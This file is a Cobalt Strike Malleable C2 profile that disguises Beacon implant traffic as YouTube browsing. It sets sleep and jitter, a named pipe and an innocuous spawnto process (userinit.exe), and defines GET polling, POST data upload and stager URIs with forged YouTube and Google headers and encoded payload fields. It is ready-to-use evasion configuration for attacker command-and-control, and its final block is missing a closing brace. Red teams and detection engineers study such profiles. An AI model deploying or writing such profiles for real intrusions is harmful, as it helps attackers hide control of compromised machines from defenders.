#
# YouTube browsing traffic profile
# 
# Author: @ChickySticky
#

set sleeptime "1000";
set jitter    "42";
set maxdns    "255";
set pipename "1790CPT"
## Recommended Spawnto: armsvc, SearchIndexer, conhost, MpCopyAccelerator, SearchApp, userinit
set spawnto "userinit.exe"
set useragent "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko";



################################################
## HTTP GET
################################################
## Description:
##    GET is used to poll teamserver for tasks
## Defaults:
##    uri "/activity"
##    Headers (Sample)
##      Accept: */*
##      Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31/5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3/aK0MnXoM=
##      User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1)
## Guidelines:
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Analyze sample HTTP traffic to use as a reference
##    - Multiple URIs can be added. Beacon will randomly pick from these.
##      - Use spaces as a URI seperator

http-get {

    set uri "/watch?v=w5jwxrTqoEA&ab_channel=RushVEVO"; 

    client {

        header "Accept" "*/*";
        header "Host" "www.youtube.com";
        header "Referer" "http://gds.google.com/";
        header "Accept-Encoding" "gzip, deflate";


        metadata {
            base64url;
            header "Cookie";
        }
    }

    server {

        header "Server" "Mozilla/5.0";
        header "X-Frame-Options" "SAMEORIGIN";
        header "X-XSS Protection" "1; mode=block; report=https://www.google.com/appserve/security-bugs/log/youtube";
        header "Content-Encoding" "gzip";

        output {
            print;
        }
    }
}

http-post {
    
    set uri "/watch?v=CjCtwj5yJ_o&ab_channel=TheRealMcKenzies-Topic";
    set verb "POST";

    client {

        header "Accept" "*/*";
        header "Content-Type" "text/xml";
        header "X-Requested-With" "XMLHttpRequest";
        header "Host" "www.youtube.com";

        parameter "sz" "160x600";
        parameter "oe" "oe=ISO-8859-1;";

        id {
            parameter "sn";
        }

        parameter "s" "3717";
        parameter "dc_ref" "http%3A%2F%2Fwww.youtube.com";

        output {
            base64url;
            print;
        }
    }

    server {

        header "Strict-Transport-Security" "max-age=31536000";
        header "X-XSS-Protection" "1; mode=block; report=https://www.google.com/appserve/security-bugs/log/youtube";
        header "Content-Length" "0";
        header "Cache-Control" "no-cache";
        header "Expires" "Tue, 27 Apr 1969 19:44:06 EST";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Content-Type" "video/x-flv";
        header "X-Content-Type-Options" "nosniff";
        header "Server" "YouTube Frontend Proxy";
        header "Alt-Svc" "quic=':443'; ma=2592000; v='41,39,38,37,35'";
        header "Connection" "close";

        output {
            netbios;
            print;
        }
    }
}

http-stager {

    set uri_x86 "/youtubei/v1/";
    set uri_x64 "/youtubei/V1/";


    client {

        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "X-Goog-Visitor-Id" "CgtGbFYxTWlKTU96VQ==";
        header "X-YouTube-Client-Name" "56";
        header "X-YouTube-Client-Version" "20171026";
        header "Connection" "close";
    }

    server {
        header "Cache-Control" "no-cache";
        header "Content-Type" "text/xml; charset=UTF-8";
        header "X-Frame-Options" "SAMEORIGIN";
        header "X-Content-Type-Options" "nosniff";
        header "Strict-Transport-Security" "max-age=31536000";
        header "Content-Length" "155";
        header "Expires" "Tue, 27 Apr 1969 19:44:06 EST";
        header "Date" "Fri, 27 Oct 2017 18:24:28 GMT";
        header "Server" "YouTube Frontend Proxy";
        header "X-XSS-Protection" "1; mode=block";
        header "Alt-Svc" "quic=':443'; ma=2592000; v='41,39,38,37,35'";
        header "Connection" "close";

    output {
        print;
    }
}
    

